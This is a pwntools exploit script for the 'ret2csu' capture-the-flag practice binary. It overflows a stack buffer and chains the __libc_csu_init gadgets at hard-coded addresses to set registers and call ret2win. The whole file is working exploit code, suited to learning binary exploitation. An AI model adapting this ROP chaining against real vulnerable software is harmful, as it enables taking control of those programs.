from pwn import *
target=process('./ret2csu')
print(target.recv())

csu1=0x40089a
csu2=0x400880
initptr=0x600e38
ret2win=0x4007b1

payload="A"*40
payload+=p64(csu1)
payload+=p64(0x0)
payload+=p64(0x1)
payload+=p64(initptr)
payload+=p64(0xf)
payload+=p64(0xf)
payload+=p64(0xdeadcafebabebeef)
payload+=p64(csu2)
payload+=p64(0xf)
payload+=p64(0xf)
payload+=p64(0xf)
payload+=p64(0xf)
payload+=p64(0xf)
payload+=p64(0xf)
payload+=p64(0xf)
payload+=p64(ret2win)

target.sendline(payload)
target.interactive()

